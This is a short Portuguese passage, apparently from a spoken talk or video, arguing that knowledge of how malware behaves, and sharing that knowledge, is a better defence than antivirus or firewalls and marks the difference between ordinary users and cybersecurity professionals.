A melhor defesa contra Malwares não é o antivírus, nem o Firewall; é o nosso conhecimento e também, propagar esse conhecimento; é saber que os malwares, eles agem, é saber como os malwares vão agir, por onde ele vai começar e o que que ele busca.

E essas diferenças vão ser o que vai diferenciar um usuário comum de um profissional de cybersegurança.
